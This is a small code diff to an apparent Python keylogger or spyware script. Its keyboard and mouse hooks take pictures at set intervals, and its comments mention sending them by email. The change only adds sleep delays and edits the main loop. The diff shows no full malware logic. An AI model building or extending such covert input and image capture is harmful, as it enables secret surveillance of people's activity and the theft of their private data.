@@ -36,6 +36,7 @@ def OnKeyPress(event):
 	# use to send email
 	if pic_num % 5 == 0:
 		take_picture.take_pic()
+		time.sleep(1)
 		
 	# use to record in local
 	if pic_num % 2 == 0:	
@@ -63,6 +64,7 @@ def OnMousePress(event):
 	# use to send email
 	if pic_num % 50 == 0:
 		take_picture.take_pic()
+		time.sleep(3)
 		
 	# use to record in local	
 	if pic_num % 2 == 0:	
@@ -89,9 +91,9 @@ if __name__ == '__main__':
 	
 	n = 30
 	while(1):
-		pass
+		# pass
 		# sendmail_attach.send_email()
-		# time.sleep(60 * n)
+		time.sleep(60 * n)
 		# n = n + 5
 
 
